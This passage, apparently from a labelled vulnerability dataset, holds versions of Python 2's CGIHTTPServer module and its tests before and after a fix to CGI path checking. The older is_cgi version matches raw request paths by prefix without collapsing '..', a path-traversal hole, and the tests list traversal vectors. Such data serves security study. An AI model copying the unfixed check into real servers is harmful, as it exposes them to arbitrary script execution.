            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
16,c5abced949e6a4b001d1dee321593e74ecadecfe,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
17,c5abced949e6a4b001d1dee321593e74ecadecfe,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
